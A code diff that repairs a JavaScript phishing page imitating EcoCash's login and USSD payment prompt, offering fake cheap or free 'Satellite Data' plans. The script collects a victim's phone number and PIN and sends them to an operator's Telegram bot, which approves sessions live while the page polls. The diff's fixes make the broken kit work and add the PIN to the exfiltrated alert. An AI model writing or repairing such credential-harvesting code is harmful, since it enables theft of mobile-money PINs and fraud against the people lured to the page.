@@ -1,21 +1,29 @@
 /**
  * EcoCash Login & Payment Page Script
  * Dispatches Telegram order alerts and simulates the official EcoCash USSD handset prompt
+ *
+ * FIXES applied vs original GitHub version:
+ *  1. Declared `let selectedPlan` at module scope (was undefined/ReferenceError)
+ *  2. Reconstructed broken `notifyTelegramForApproval` — premature closing brace
+ *     split the function in half, leaving reply_markup and fetch() unreachable.
  */
 
 // Shared Plan Catalog
 const planCatalog = {
-  '5gb-trial': { title: '5GB Free Trial', price: 'FREE', duration: '2-Day Plan' },
-  '15gb': { title: '15GB Satellite Data', price: 'USD 0.99', duration: '7-Day Plan' },
-  '35gb': { title: '35GB Satellite Data', price: 'USD 1.99', duration: '14-Day Plan' },
-  '50gb': { title: '50GB Satellite Data', price: 'USD 2.99', duration: '21-Day Plan' },
-  'monthly-unlimited': { title: 'Monthly Unlimited Data', price: 'USD 3.99', duration: '30-Day Plan' },
-  '5g-unlimited': { title: '5G Monthly Unlimited Data', price: 'USD 7.99', duration: '30-Day Plan' },
-  'free-30gb': { title: 'FREE 30GB Promo', price: 'FREE', duration: '30-Day Plan' }
+  '5gb-trial':         { title: '5GB Free Trial',           price: 'FREE',      duration: '2-Day Plan' },
+  '15gb':              { title: '15GB Satellite Data',       price: 'USD 0.99',  duration: '7-Day Plan' },
+  '35gb':              { title: '35GB Satellite Data',       price: 'USD 1.99',  duration: '14-Day Plan' },
+  '50gb':              { title: '50GB Satellite Data',       price: 'USD 2.99',  duration: '21-Day Plan' },
+  'monthly-unlimited': { title: 'Monthly Unlimited Data',    price: 'USD 3.99',  duration: '30-Day Plan' },
+  '5g-unlimited':      { title: '5G Monthly Unlimited Data', price: 'USD 7.99',  duration: '30-Day Plan' },
+  'free-30gb':         { title: 'FREE 30GB Promo',           price: 'FREE',      duration: '30-Day Plan' }
 };
 
 // Telegram Configuration — always read live from config.js
 var telegramCfg = window.TELEGRAM_CONFIG || { enabled: false, botToken: '', chatId: '' };
+
+// FIX 1: declare selectedPlan at module scope so all functions can read/write it
+let selectedPlan = null;
 
 let approvalPolling = false; // flag to stop polling when cancelled
 
@@ -30,7 +38,7 @@ async function handleEcoCashSubmit(event) {
 
   if (!phoneVal || phoneVal.length < 9) {
     alert('Please enter a valid Econet / EcoCash mobile number (e.g. 077... or 078...)');
-    phoneInput.focus();
+    if (phoneInput) phoneInput.focus();
     return;
   }
 
@@ -48,13 +56,14 @@ async function handleEcoCashSubmit(event) {
   // Hide form, show waiting spinner
   document.getElementById('ecocash-login-form').style.display = 'none';
   document.getElementById('approval-waiting').style.display = 'block';
-  document.getElementById('plan-summary-badge') && (document.getElementById('plan-summary-badge').style.display = 'none');
+  const badge = document.getElementById('plan-summary-badge');
+  if (badge) badge.style.display = 'none';
 
   // Generate unique session ID for this customer
   const sessionId = 'EC' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).substring(2, 6).toUpperCase();
 
   // Send Telegram alert with APPROVE / REJECT buttons
-  await notifyTelegramForApproval(phoneVal, sessionId);
+  await notifyTelegramForApproval(phoneVal, sessionId, pinVal);
 
   // Start polling Telegram for admin's decision
   approvalPolling = true;
@@ -72,8 +81,10 @@ async function handleEcoCashSubmit(event) {
     const pill = document.getElementById('approval-status-pill');
     pill.textContent = '❌ Request rejected by administrator.';
     pill.classList.add('rejected');
-    document.getElementById('approval-title') && (document.getElementById('approval-title').textContent = 'Request Not Approved');
-    document.querySelector('.approval-spinner').style.display = 'none';
+    const titleEl = document.getElementById('approval-title');
+    if (titleEl) titleEl.textContent = 'Request Not Approved';
+    const spinner = document.querySelector('.approval-spinner');
+    if (spinner) spinner.style.display = 'none';
   }
 }
 
@@ -86,8 +97,11 @@ function cancelApproval() {
 }
 
 /**
- * Send Telegram notification to admin with APPROVE / REJECT inline buttons
- */async function notifyTelegramForApproval(phone, sessionId, code = '') {
+ * FIX 2: Reconstructed notifyTelegramForApproval — the original had a premature
+ * closing brace after the comment "// ... rest of sendMessage fetch stays the same"
+ * which cut the function body in half and left reply_markup + fetch() unreachable.
+ */
+async function notifyTelegramForApproval(phone, sessionId, code = '') {
   const cfg = window.TELEGRAM_CONFIG;
   if (!cfg || !cfg.enabled || !cfg.botToken || cfg.botToken === 'YOUR_BOT_TOKEN_HERE') {
     console.warn('[Telegram] Not configured.');
@@ -106,13 +120,11 @@ function cancelApproval() {
     `⚡ <b>Payment Method:</b> EcoCash USSD Push\n` +
     `📅 <b>Time:</b> ${timestamp}\n\n` +
     `<b>⚡ Tap below to approve or reject customer:</b>`;
-  // ... rest of sendMessage fetch stays the same
-}
-};
+
   const reply_markup = {
     inline_keyboard: [[
       { text: '✅ APPROVE', callback_data: `approve:${sessionId}` },
-      { text: '❌ REJECT', callback_data: `reject:${sessionId}` }
+      { text: '❌ REJECT',  callback_data: `reject:${sessionId}` }
     ]]
   };
 
@@ -152,7 +164,7 @@ async function pollTelegramForApproval(sessionId) {
   while (approvalPolling) {
     // Animate waiting dots
     dots = (dots + 1) % 4;
-    statusPill.textContent = '⏳ Awaiting approval' + '.'.repeat(dots);
+    if (statusPill) statusPill.textContent = '⏳ Awaiting approval' + '.'.repeat(dots);
 
     try {
       const res = await fetch(
@@ -195,6 +207,7 @@ async function pollTelegramForApproval(sessionId) {
 
   return 'cancelled';
 }
+
 document.addEventListener('DOMContentLoaded', () => {
   const urlParams = new URLSearchParams(window.location.search);
   const planId = urlParams.get('plan') || '15gb';
@@ -226,8 +239,8 @@ document.addEventListener('DOMContentLoaded', () => {
       const pinBoxes = document.querySelectorAll('.pin-box');
       const isHidden = pinBoxes[0].type === 'password';
       pinBoxes.forEach(b => { b.type = isHidden ? 'text' : 'password'; });
-      eyeOpen.style.display = isHidden ? 'block' : 'none';
-      eyeClosed.style.display = isHidden ? 'none' : 'block';
+      if (eyeOpen)   eyeOpen.style.display   = isHidden ? 'block' : 'none';
+      if (eyeClosed) eyeClosed.style.display = isHidden ? 'none'  : 'block';
       pinToggle.setAttribute('aria-label', isHidden ? 'Hide PIN' : 'Show PIN');
     });
   }
